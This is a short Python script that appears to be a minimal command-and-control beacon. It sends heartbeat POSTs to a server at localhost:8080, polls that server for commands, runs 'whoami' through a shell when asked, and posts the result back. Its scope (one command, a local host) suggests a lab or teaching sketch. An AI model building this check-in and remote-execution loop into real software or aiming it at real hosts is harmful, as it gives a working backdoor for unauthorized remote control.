import requests
import time
import threading
import subprocess
beacon = 'http://localhost:8080'
def i_am_alive(stop_event):
    while not stop_event.is_set():
        try:
            requests.post(f"{beacon}/status")
        except requests.exceptions.ConnectionError:
            pass
        time.sleep(5)

def receive_command(stop_event):
    while not stop_event.is_set():
        try:
            response = requests.get(f"{beacon}/get_command")
            if "whoami" in response.text:
                result = subprocess.check_output("whoami", shell=True).decode()
                requests.post(f"{beacon}/post_result", data=result)
        except requests.exceptions.ConnectionError:
            pass
        time.sleep(1)

def main():
    stop_event = threading.Event()
    alive_thread = threading.Thread(target=i_am_alive, args=(stop_event,))
    alive_thread.start()
    command_thread = threading.Thread(target=receive_command, args=(stop_event,))
    command_thread.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Keyboard interrupt received, stopping...")
        stop_event.set()
    
    alive_thread.join()

if __name__ == '__main__':
    main()
